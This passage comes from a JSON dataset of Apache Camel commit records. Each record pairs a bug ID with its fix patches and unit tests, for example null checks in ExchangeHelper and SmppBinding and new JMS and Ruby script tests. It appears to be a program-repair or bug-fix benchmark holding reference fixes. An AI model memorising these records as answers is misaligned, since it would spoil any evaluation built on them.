                "blob_url": "https://github.com/apache/camel/blob/ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5/components/camel-jms/src/test/java/org/apache/camel/component/jms/FileRouteToJmsToFileTest.java",
                "changes": 72,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jms/src/test/java/org/apache/camel/component/jms/FileRouteToJmsToFileTest.java?ref=ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5",
                "deletions": 0,
                "filename": "components/camel-jms/src/test/java/org/apache/camel/component/jms/FileRouteToJmsToFileTest.java",
                "patch": "@@ -0,0 +1,72 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.jms;\n+\n+import java.io.File;\n+import javax.jms.ConnectionFactory;\n+\n+import org.apache.activemq.ActiveMQConnectionFactory;\n+import org.apache.camel.CamelContext;\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.file.FileComponent;\n+import org.apache.camel.component.mock.MockEndpoint;\n+\n+import static org.apache.camel.component.jms.JmsComponent.jmsComponentClientAcknowledge;\n+\n+\n+/**\n+ * Unit test that we can do file over JMS to file.\n+ */\n+public class FileRouteToJmsToFileTest extends ContextTestSupport {\n+\n+    protected String componentName = \"activemq\";\n+\n+    public void testRouteFileToFile() throws Exception {\n+        deleteDirectory(\"target/file2file\");\n+        MockEndpoint mock = getMockEndpoint(\"mock:result\");\n+        mock.expectedMessageCount(1);\n+\n+        template.sendBodyAndHeader(\"file://target/file2file/in\", \"Hello World\", FileComponent.HEADER_FILE_NAME, \"hello.txt\");\n+\n+        assertMockEndpointsSatisfied();\n+        Thread.sleep(100);\n+\n+        File file = new File(\"./target/file2file/out/hello.txt\");\n+        file = file.getAbsoluteFile();\n+        assertTrue(\"The file should exists\", file.exists());\n+    }\n+\n+    protected CamelContext createCamelContext() throws Exception {\n+        CamelContext camelContext = super.createCamelContext();\n+\n+        ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(\"vm://localhost?broker.persistent=false\");\n+        camelContext.addComponent(componentName, jmsComponentClientAcknowledge(connectionFactory));\n+\n+        return camelContext;\n+    }\n+\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            public void configure() throws Exception {\n+                from(\"file://target/file2file/in\").to(\"activemq:queue:hello\");\n+\n+                from(\"activemq:queue:hello\").to(\"file://target/file2file/out\", \"mock:result\");\n+            }\n+        };\n+    }\n+}\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5/components/camel-jms/src/test/java/org/apache/camel/component/jms/FileRouteToJmsToFileTest.java",
                "sha": "36af54fc8d3654d88f441da815a8d4ed45e1ab30",
                "status": "added"
            },
            {
                "additions": 10,
                "blob_url": "https://github.com/apache/camel/blob/ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5/components/camel-jpa/src/main/java/org/apache/camel/processor/interceptor/JpaTraceEventMessage.java",
                "changes": 11,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jpa/src/main/java/org/apache/camel/processor/interceptor/JpaTraceEventMessage.java?ref=ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5",
                "deletions": 1,
                "filename": "components/camel-jpa/src/main/java/org/apache/camel/processor/interceptor/JpaTraceEventMessage.java",
                "patch": "@@ -34,8 +34,8 @@\n \n     protected Long id;\n     protected Date timestamp;\n-    protected String previousNode;\n     protected String fromEndpointUri;\n+    protected String previousNode;\n     protected String toNode;\n     protected String exchangeId;\n     protected String shortExchangeId;\n@@ -44,6 +44,7 @@\n     protected String headers;\n     protected String body;\n     protected String bodyType;\n+    protected String outHeaders;\n     protected String outBody;\n     protected String outBodyType;\n     protected String causedByException;\n@@ -165,6 +166,14 @@ public void setOutBodyType(String outBodyType) {\n         this.outBodyType = outBodyType;\n     }\n \n+    public String getOutHeaders() {\n+        return outHeaders;\n+    }\n+\n+    public void setOutHeaders(String outHeaders) {\n+        this.outHeaders = outHeaders;\n+    }\n+\n     public String getCausedByException() {\n         return causedByException;\n     }",
                "raw_url": "https://github.com/apache/camel/raw/ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5/components/camel-jpa/src/main/java/org/apache/camel/processor/interceptor/JpaTraceEventMessage.java",
                "sha": "99207abb7408db1f2131afa50e3b31354c051e49",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5/components/camel-stream/src/main/java/org/apache/camel/component/stream/StreamComponent.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-stream/src/main/java/org/apache/camel/component/stream/StreamComponent.java?ref=ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5",
                "deletions": 3,
                "filename": "components/camel-stream/src/main/java/org/apache/camel/component/stream/StreamComponent.java",
                "patch": "@@ -26,9 +26,6 @@\n  */\n public class StreamComponent extends DefaultComponent {\n \n-    // TODO: remove file and url support in this component. Will be removed in Camel 2.0\n-    // (Should use other components for such needs.)\n-\n     @Override\n     protected Endpoint createEndpoint(String uri, String remaining, Map parameters)\n         throws Exception {",
                "raw_url": "https://github.com/apache/camel/raw/ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5/components/camel-stream/src/main/java/org/apache/camel/component/stream/StreamComponent.java",
                "sha": "046ba8a0a171ce75ad8521272442271e3c82699c",
                "status": "modified"
            }
        ],
        "message": "CAMEL-1255: Added jpa trace event. Added assert not null in batch processor since I get a NPE. Added jms unit tests based on end user having a problem. Removed TODO in code.\n\ngit-svn-id: https://svn.apache.org/repos/asf/activemq/camel/trunk@735733 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/69ba66b2c6e31f6028fe86c523ba920ff6140c41",
        "patched_files": [
            "JpaTraceEventMessage.java",
            "BatchProcessor.java",
            "DefaultTraceEventMessage.java",
            "DefaultTraceFormatter.java",
            "StreamComponent.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "FileRouteToJmsToFileTest.java"
        ]
    },
    "camel_add071b": {
        "bug_id": "camel_add071b",
        "commit": "https://github.com/apache/camel/commit/add071b58447bcd5fb8a7abf91ed257a59fe693c",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/add071b58447bcd5fb8a7abf91ed257a59fe693c/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=add071b58447bcd5fb8a7abf91ed257a59fe693c",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -899,9 +899,11 @@ public RouteController getRouteController() {\n     }\n \n     public Route getRoute(String id) {\n-        for (Route route : getRoutes()) {\n-            if (route.getId().equals(id)) {\n-                return route;\n+        if (id != null) {\n+            for (Route route : getRoutes()) {\n+                if (route.getId().equals(id)) {\n+                    return route;\n+                }\n             }\n         }\n         return null;",
                "raw_url": "https://github.com/apache/camel/raw/add071b58447bcd5fb8a7abf91ed257a59fe693c/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "daee1bfe8fb3e967cd250064b11818e81910913e",
                "status": "modified"
            },
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/add071b58447bcd5fb8a7abf91ed257a59fe693c/camel-core/src/main/java/org/apache/camel/util/ExchangeHelper.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/ExchangeHelper.java?ref=add071b58447bcd5fb8a7abf91ed257a59fe693c",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/util/ExchangeHelper.java",
                "patch": "@@ -40,6 +40,7 @@\n import org.apache.camel.NoSuchHeaderException;\n import org.apache.camel.NoSuchPropertyException;\n import org.apache.camel.NoTypeConversionAvailableException;\n+import org.apache.camel.Route;\n import org.apache.camel.TypeConversionException;\n import org.apache.camel.TypeConverter;\n import org.apache.camel.impl.DefaultExchange;\n@@ -687,10 +688,11 @@ public static boolean isInterrupted(Exchange exchange) {\n      * @return <tt>true</tt> if enabled, <tt>false</tt> otherwise\n      */\n     public static boolean isStreamCachingEnabled(final Exchange exchange) {\n-        if (exchange.getFromRouteId() == null) {\n-            return exchange.getContext().getStreamCachingStrategy().isEnabled();\n+        Route route = exchange.getContext().getRoute(exchange.getFromRouteId());\n+        if (route != null) {\n+            return route.getRouteContext().isStreamCaching();\n         } else {\n-            return exchange.getContext().getRoute(exchange.getFromRouteId()).getRouteContext().isStreamCaching();\n+            return exchange.getContext().getStreamCachingStrategy().isEnabled();\n         }\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/add071b58447bcd5fb8a7abf91ed257a59fe693c/camel-core/src/main/java/org/apache/camel/util/ExchangeHelper.java",
                "sha": "f588af596f07bdedd9308b2698af762142dea692",
                "status": "modified"
            },
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/add071b58447bcd5fb8a7abf91ed257a59fe693c/camel-core/src/test/java/org/apache/camel/util/ExchangeHelperTest.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/util/ExchangeHelperTest.java?ref=add071b58447bcd5fb8a7abf91ed257a59fe693c",
                "deletions": 1,
                "filename": "camel-core/src/test/java/org/apache/camel/util/ExchangeHelperTest.java",
                "patch": "@@ -177,11 +177,17 @@ public void testGetContentType() throws Exception {\n         assertEquals(\"text/xml\", ExchangeHelper.getContentType(exchange));\n     }\n \n-    public void testGetContentEncpding() throws Exception {\n+    public void testGetContentEncoding() throws Exception {\n         exchange.getIn().setHeader(Exchange.CONTENT_ENCODING, \"iso-8859-1\");\n         assertEquals(\"iso-8859-1\", ExchangeHelper.getContentEncoding(exchange));\n     }\n \n+    public void testIsStreamCaching() throws Exception {\n+        assertFalse(ExchangeHelper.isStreamCachingEnabled(exchange));\n+        exchange.getContext().getStreamCachingStrategy().setEnabled(true);\n+        assertTrue(ExchangeHelper.isStreamCachingEnabled(exchange));\n+    }\n+\n     @Override\n     protected void setUp() throws Exception {\n         super.setUp();",
                "raw_url": "https://github.com/apache/camel/raw/add071b58447bcd5fb8a7abf91ed257a59fe693c/camel-core/src/test/java/org/apache/camel/util/ExchangeHelperTest.java",
                "sha": "ab6ebfb3eb34acd2af7838b1d224aba6467d9ab7",
                "status": "modified"
            }
        ],
        "message": "CAMEL-12348: camel-core - Potential NPE in ExchangeHelper.isStreamCaching",
        "parent": "https://github.com/apache/camel/commit/5dfe75e955c620e39bd4cd00f86a049069c1298f",
        "patched_files": [
            "DefaultCamelContext.java",
            "ExchangeHelper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCamelContextTest.java",
            "ExchangeHelperTest.java"
        ]
    },
    "camel_afc17d7": {
        "bug_id": "camel_afc17d7",
        "commit": "https://github.com/apache/camel/commit/afc17d741dd4f8be7990b2d04a94ffd6b9be8d58",
        "file": [
            {
                "additions": 17,
                "blob_url": "https://github.com/apache/camel/blob/afc17d741dd4f8be7990b2d04a94ffd6b9be8d58/components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppBinding.java",
                "changes": 19,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppBinding.java?ref=afc17d741dd4f8be7990b2d04a94ffd6b9be8d58",
                "deletions": 2,
                "filename": "components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppBinding.java",
                "patch": "@@ -17,7 +17,9 @@\n package org.apache.camel.component.smpp;\n \n import java.io.UnsupportedEncodingException;\n+import java.util.Arrays;\n import java.util.Date;\n+import java.util.List;\n \n import org.apache.camel.Exchange;\n import org.apache.camel.Message;\n@@ -26,6 +28,8 @@\n import org.jsmpp.bean.DataSm;\n import org.jsmpp.bean.DeliverSm;\n import org.jsmpp.bean.DeliveryReceipt;\n+import org.jsmpp.bean.OptionalParameter;\n+import org.jsmpp.bean.OptionalParameter.OctetString;\n import org.jsmpp.bean.SubmitSm;\n import org.jsmpp.util.AbsoluteTimeFormatter;\n import org.jsmpp.util.TimeFormatter;\n@@ -214,8 +218,19 @@ public SmppMessage createSmppMessage(DeliverSm deliverSm) throws Exception {\n             smppMessage.setHeader(SUBMITTED, smscDeliveryReceipt.getSubmitted());\n             smppMessage.setHeader(FINAL_STATUS, smscDeliveryReceipt.getFinalStatus());\n         } else {\n-            smppMessage.setBody(String.valueOf(new String(deliverSm.getShortMessage(),\n-                    configuration.getEncoding())));\n+            if (deliverSm.getShortMessage() != null) {\n+                smppMessage.setBody(String.valueOf(new String(deliverSm.getShortMessage(),\n+                        configuration.getEncoding())));\n+            } else if (deliverSm.getOptionalParametes() != null && deliverSm.getOptionalParametes().length > 0) {\n+                List<OptionalParameter> oplist = Arrays.asList(deliverSm.getOptionalParametes());\n+\n+                for (OptionalParameter optPara : oplist) {\n+                    if (OptionalParameter.Tag.MESSAGE_PAYLOAD.code() == optPara.tag && OctetString.class.isInstance(optPara)) {\n+                        smppMessage.setBody(((OctetString) optPara).getValueAsString());\n+                        break;\n+                    }\n+                }\n+            }\n \n             smppMessage.setHeader(SEQUENCE_NUMBER, deliverSm.getSequenceNumber());\n             smppMessage.setHeader(COMMAND_ID, deliverSm.getCommandId());",
                "raw_url": "https://github.com/apache/camel/raw/afc17d741dd4f8be7990b2d04a94ffd6b9be8d58/components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppBinding.java",
                "sha": "5ea30e11f76bd59c8bfadfd2ecd665621853a7d9",
                "status": "modified"
            },
            {
                "additions": 31,
                "blob_url": "https://github.com/apache/camel/blob/afc17d741dd4f8be7990b2d04a94ffd6b9be8d58/components/camel-smpp/src/test/java/org/apache/camel/component/smpp/SmppBindingTest.java",
                "changes": 32,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-smpp/src/test/java/org/apache/camel/component/smpp/SmppBindingTest.java?ref=afc17d741dd4f8be7990b2d04a94ffd6b9be8d58",
                "deletions": 1,
                "filename": "components/camel-smpp/src/test/java/org/apache/camel/component/smpp/SmppBindingTest.java",
                "patch": "@@ -26,13 +26,19 @@\n import org.jsmpp.bean.DataSm;\n import org.jsmpp.bean.DeliverSm;\n import org.jsmpp.bean.NumberingPlanIndicator;\n+import org.jsmpp.bean.OptionalParameter;\n+import org.jsmpp.bean.OptionalParameter.OctetString;\n import org.jsmpp.bean.SubmitSm;\n import org.jsmpp.bean.TypeOfNumber;\n import org.jsmpp.util.DeliveryReceiptState;\n import org.junit.Before;\n import org.junit.Test;\n \n-import static org.junit.Assert.*;\n+import static org.junit.Assert.assertArrayEquals;\n+import static org.junit.Assert.assertEquals;\n+import static org.junit.Assert.assertNotNull;\n+import static org.junit.Assert.assertNull;\n+import static org.junit.Assert.assertSame;\n \n /**\n  * JUnit test class for <code>org.apache.camel.component.smpp.SmppBinding</code>\n@@ -213,6 +219,30 @@ public void createSmppMessageFromDeliverSmShouldReturnASmppMessage() throws Exce\n         assertEquals(\"WAP\", smppMessage.getHeader(SmppBinding.SERVICE_TYPE));\n     }\n     \n+    @Test\n+    public void createSmppMessageFromDeliverSmWithPayloadInOptionalParameterShouldReturnASmppMessage() throws Exception {\n+        DeliverSm deliverSm = new DeliverSm();\n+        deliverSm.setSequenceNumber(1);\n+        deliverSm.setCommandId(1);\n+        deliverSm.setSourceAddr(\"1818\");\n+        deliverSm.setDestAddress(\"1919\");\n+        deliverSm.setScheduleDeliveryTime(\"090831230627004+\");\n+        deliverSm.setValidityPeriod(\"090901230627004+\");\n+        deliverSm.setServiceType(\"WAP\");\n+        deliverSm.setOptionalParametes(new OctetString(OptionalParameter.Tag.MESSAGE_PAYLOAD, \"Hello SMPP world!\"));\n+        SmppMessage smppMessage = binding.createSmppMessage(deliverSm);\n+        \n+        assertEquals(\"Hello SMPP world!\", smppMessage.getBody());\n+        assertEquals(7, smppMessage.getHeaders().size());\n+        assertEquals(1, smppMessage.getHeader(SmppBinding.SEQUENCE_NUMBER));\n+        assertEquals(1, smppMessage.getHeader(SmppBinding.COMMAND_ID));\n+        assertEquals(\"1818\", smppMessage.getHeader(SmppBinding.SOURCE_ADDR));\n+        assertEquals(\"1919\", smppMessage.getHeader(SmppBinding.DEST_ADDR));\n+        assertEquals(\"090831230627004+\", smppMessage.getHeader(SmppBinding.SCHEDULE_DELIVERY_TIME));\n+        assertEquals(\"090901230627004+\", smppMessage.getHeader(SmppBinding.VALIDITY_PERIOD));\n+        assertEquals(\"WAP\", smppMessage.getHeader(SmppBinding.SERVICE_TYPE));\n+    }\n+    \n     @Test\n     public void createSmppMessageFromDataSmShouldReturnASmppMessage() throws Exception {\n         DataSm dataSm = new DataSm();",
                "raw_url": "https://github.com/apache/camel/raw/afc17d741dd4f8be7990b2d04a94ffd6b9be8d58/components/camel-smpp/src/test/java/org/apache/camel/component/smpp/SmppBindingTest.java",
                "sha": "495b676b3de9d30213f0c57db6651a6abbdafd0f",
                "status": "modified"
            }
        ],
        "message": "CAMEL-3321: SmppBinding raises NullPointerException when an SMSC insert the Short Message Data inside the message_payload field\nThanks Vincenzo for reporting the issue and providing the patch.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1032785 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/11b317839809f4a40d2dd4a118f13d4e0ea1a548",
        "patched_files": [
            "SmppBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "SmppBindingTest.java"
        ]
    },
    "camel_b155265": {
        "bug_id": "camel_b155265",
        "commit": "https://github.com/apache/camel/commit/b1552656f52b33379773b2e26cf4df8a64790039",
        "file": [
            {
                "additions": 71,
                "blob_url": "https://github.com/apache/camel/blob/b1552656f52b33379773b2e26cf4df8a64790039/components/camel-script/src/test/java/org/apache/camel/builder/script/RubyScriptTextTest.java",
                "changes": 71,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-script/src/test/java/org/apache/camel/builder/script/RubyScriptTextTest.java?ref=b1552656f52b33379773b2e26cf4df8a64790039",
                "deletions": 0,
                "filename": "components/camel-script/src/test/java/org/apache/camel/builder/script/RubyScriptTextTest.java",
                "patch": "@@ -0,0 +1,71 @@\n+package org.apache.camel.builder.script;\r\n+\r\n+\r\n+import java.util.HashSet;\r\n+import java.util.Set;\r\n+import java.util.concurrent.CountDownLatch;\r\n+import java.util.concurrent.TimeUnit;\r\n+\r\n+import org.junit.Assert;\r\n+import org.junit.Ignore;\r\n+import org.apache.camel.EndpointInject;\r\n+import org.apache.camel.Exchange;\r\n+import org.apache.camel.Processor;\r\n+import org.apache.camel.builder.RouteBuilder;\r\n+import org.apache.camel.component.mock.MockEndpoint;\r\n+import org.apache.camel.test.junit4.CamelTestSupport;\r\n+import org.junit.Test;\r\n+\r\n+public class RubyScriptTextTest extends CamelTestSupport {\r\n+\r\n+    @EndpointInject(uri = \"mock:result\")\r\n+    MockEndpoint resultEndpoint;\r\n+\r\n+    final int messageCount = 500;\r\n+\r\n+    @Test\r\n+    public void parallelExecutionWithCachedScriptAndReusedScriptEngine() throws Exception {\r\n+        context.addRoutes(new RouteBuilder() {\r\n+            public void configure() throws Exception {\r\n+                getContext().getProperties().put(Exchange.REUSE_SCRIPT_ENGINE, \"true\");\r\n+                //getContext().getProperties().put(Exchange.COMPILE_SCRIPT, \"true\");\r\n+\r\n+                from(\"seda:jruby?concurrentConsumers=5\")\r\n+                    .to(\"language:ruby:puts $request.body;result = $request.body?cacheScript=true\")\r\n+                    .to(resultEndpoint);\r\n+            }\r\n+        });\r\n+\r\n+        resultEndpoint.setExpectedMessageCount(messageCount);\r\n+        resultEndpoint.assertNoDuplicates(body());\r\n+\r\n+        for (int i = 1; i < messageCount + 1; i++) {\r\n+            template.sendBody(\"seda:jruby\", \"BODY\" + i);\r\n+        }\r\n+\r\n+        assertMockEndpointsSatisfied(5, TimeUnit.SECONDS);\r\n+    }\r\n+\r\n+    @Test\r\n+    @Ignore\r\n+    public void parallelExecutionWithoutCachedScriptAndNewScriptEngineForEachExchange() throws Exception {\r\n+        context.addRoutes(new RouteBuilder() {\r\n+            public void configure() throws Exception {\r\n+                //getContext().getProperties().put(Exchange.COMPILE_SCRIPT, \"true\");\r\n+\r\n+                from(\"seda:jruby?concurrentConsumers=5\")\r\n+                    .to(\"language:ruby:puts $request.body;result = $request.body\")\r\n+                    .to(resultEndpoint);\r\n+            }\r\n+        });\r\n+\r\n+        resultEndpoint.setExpectedMessageCount(messageCount);\r\n+        resultEndpoint.assertNoDuplicates(body());\r\n+\r\n+        for (int i = 1; i < messageCount + 1; i++) {\r\n+            template.sendBody(\"seda:jruby\", \"BODY\" + i);\r\n+        }\r\n+\r\n+        assertMockEndpointsSatisfied(5, TimeUnit.SECONDS);\r\n+    }\r\n+}\r",
                "raw_url": "https://github.com/apache/camel/raw/b1552656f52b33379773b2e26cf4df8a64790039/components/camel-script/src/test/java/org/apache/camel/builder/script/RubyScriptTextTest.java",
                "sha": "875f3091ebf0e6dbbd1515fe7137b5ab9f2746ce",
                "status": "added"
            }
        ],
        "message": "CAMEL-8201: NPE with language:ruby and concurrentConsumers - added unit test which is reproducing the issue",
        "parent": "https://github.com/apache/camel/commit/c02a759acba28bd012502feedac51e52f1d9f40d",
        "patched_files": [],
        "repo": "camel",
        "unit_tests": [
            "RubyScriptTextTest.java"
        ]
    },
    "camel_b3763dd": {
        "bug_id": "camel_b3763dd",
        "commit": "https://github.com/apache/camel/commit/b3763ddc378149d7cd995a7ed66543264f5b7e03",
        "file": [
            {
                "additions": 13,
                "blob_url": "https://github.com/apache/camel/blob/b3763ddc378149d7cd995a7ed66543264f5b7e03/camel-core/src/main/java/org/apache/camel/model/ExpressionSubElementDefinition.java",
                "changes": 13,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/ExpressionSubElementDefinition.java?ref=b3763ddc378149d7cd995a7ed66543264f5b7e03",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/model/ExpressionSubElementDefinition.java",
                "patch": "@@ -90,4 +90,17 @@ public Predicate createPredicate(RouteContext routeContext) {\n         }\n         return getPredicate();\n     }\n+\n+    @Override\n+    public String toString() {\n+        if (expression != null) {\n+            return expression.toString();\n+        } else if (expressionType != null) {\n+            return expressionType.toString();\n+        } else if (predicate != null) {\n+            return predicate.toString();\n+        }\n+        return super.toString();\n+    }\n }\n+",
                "raw_url": "https://github.com/apache/camel/raw/b3763ddc378149d7cd995a7ed66543264f5b7e03/camel-core/src/main/java/org/apache/camel/model/ExpressionSubElementDefinition.java",
                "sha": "c0037e90ec9cff90c7c011a34d4381ca2fb1d54f",
                "status": "modified"
            },
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/b3763ddc378149d7cd995a7ed66543264f5b7e03/camel-core/src/main/java/org/apache/camel/processor/Enricher.java",
                "changes": 10,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/Enricher.java?ref=b3763ddc378149d7cd995a7ed66543264f5b7e03",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/Enricher.java",
                "patch": "@@ -115,8 +115,10 @@ public void process(Exchange exchange) throws Exception {\n                 // prepare the exchanges for aggregation\n                 ExchangeHelper.prepareAggregation(exchange, resourceExchange);\n                 Exchange aggregatedExchange = aggregationStrategy.aggregate(exchange, resourceExchange);\n-                // copy aggregation result onto original exchange (preserving pattern)\n-                copyResultsPreservePattern(exchange, aggregatedExchange);\n+                if (aggregatedExchange != null) {\n+                    // copy aggregation result onto original exchange (preserving pattern)\n+                    copyResultsPreservePattern(exchange, aggregatedExchange);\n+                }\n             } else {\n                 if (LOG.isTraceEnabled()) {\n                     LOG.trace(\"Cannot aggregate exchange as its filtered: \" + resourceExchange);\n@@ -166,7 +168,9 @@ protected void doStop() throws Exception {\n     private static class CopyAggregationStrategy implements AggregationStrategy {\n \n         public Exchange aggregate(Exchange oldExchange, Exchange newExchange) {\n-            copyResultsPreservePattern(oldExchange, newExchange);\n+            if (newExchange != null) {\n+                copyResultsPreservePattern(oldExchange, newExchange);\n+            }\n             return oldExchange;\n         }\n ",
                "raw_url": "https://github.com/apache/camel/raw/b3763ddc378149d7cd995a7ed66543264f5b7e03/camel-core/src/main/java/org/apache/camel/processor/Enricher.java",
                "sha": "ed0e910a09a9341dfc643e42ed0629803c5297de",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/b3763ddc378149d7cd995a7ed66543264f5b7e03/camel-core/src/main/java/org/apache/camel/processor/PollEnricher.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/PollEnricher.java?ref=b3763ddc378149d7cd995a7ed66543264f5b7e03",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/PollEnricher.java",
                "patch": "@@ -182,7 +182,7 @@ protected void preChceckPoll(Exchange exchange) throws Exception {\n             boolean fileBasedConsumer = edpc.getEndpoint().getEndpointKey().startsWith(\"file\") || edpc.getEndpoint().getEndpointKey().startsWith(\"ftp\");\n             boolean fileBasedExchange = exchange.getFromEndpoint().getEndpointUri().startsWith(\"file\") || exchange.getFromEndpoint().getEndpointUri().startsWith(\"ftp\");\n             if (fileBasedConsumer && fileBasedExchange) {\n-                throw new IllegalArgumentException(\"Camel durrently does not support pollEnrich from a file/ftp endpoint\"\n+                throw new IllegalArgumentException(\"Camel currently does not support pollEnrich from a file/ftp endpoint\"\n                         + \" when the route also started from a file/ftp endpoint.\"\n                         + \" Started from: \" + exchange.getFromEndpoint().getEndpointUri() + \" pollEnrich: \" + edpc.getEndpoint().getEndpointUri());\n             }\n@@ -230,7 +230,9 @@ protected void doStop() throws Exception {\n     private static class CopyAggregationStrategy implements AggregationStrategy {\n \n         public Exchange aggregate(Exchange oldExchange, Exchange newExchange) {\n-            copyResultsPreservePattern(oldExchange, newExchange);\n+            if (newExchange != null) {\n+                copyResultsPreservePattern(oldExchange, newExchange);\n+            }\n             return oldExchange;\n         }\n ",
                "raw_url": "https://github.com/apache/camel/raw/b3763ddc378149d7cd995a7ed66543264f5b7e03/camel-core/src/main/java/org/apache/camel/processor/PollEnricher.java",
                "sha": "80695ec96b4f2cfe3bc4b2c9e4bd36f6b776beb5",
                "status": "modified"
            },
            {
                "additions": 64,
                "blob_url": "https://github.com/apache/camel/blob/b3763ddc378149d7cd995a7ed66543264f5b7e03/camel-core/src/test/java/org/apache/camel/processor/RecipientListBeanTest.java",
                "changes": 64,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/processor/RecipientListBeanTest.java?ref=b3763ddc378149d7cd995a7ed66543264f5b7e03",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/processor/RecipientListBeanTest.java",
                "patch": "@@ -0,0 +1,64 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.processor;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.apache.camel.impl.JndiRegistry;\n+\n+/**\n+ * @version $Revision$\n+ */\n+public class RecipientListBeanTest extends ContextTestSupport {\n+\n+    @Override\n+    protected JndiRegistry createRegistry() throws Exception {\n+        JndiRegistry jndi = super.createRegistry();\n+        jndi.bind(\"myBean\", new MyBean());\n+        return jndi;\n+    }\n+\n+    public void testRecipientListWithBean() throws Exception {\n+        MockEndpoint mock = getMockEndpoint(\"mock:result\");\n+        mock.expectedBodiesReceived(\"Hello c\");\n+\n+        String out = template.requestBody(\"direct:start\", \"direct:a,direct:b,direct:c\", String.class);\n+        assertEquals(\"Hello c\", out);\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+    protected RouteBuilder createRouteBuilder() {\n+        return new RouteBuilder() {\n+            public void configure() {\n+                from(\"direct:start\").recipientList(bean(\"myBean\", \"foo\")).to(\"mock:result\");\n+\n+                from(\"direct:a\").transform(constant(\"Hello a\"));\n+                from(\"direct:b\").transform(constant(\"Hello b\"));\n+                from(\"direct:c\").transform(constant(\"Hello c\"));\n+            }\n+        };\n+    }\n+\n+    public class MyBean {\n+\n+        public String[] foo(String 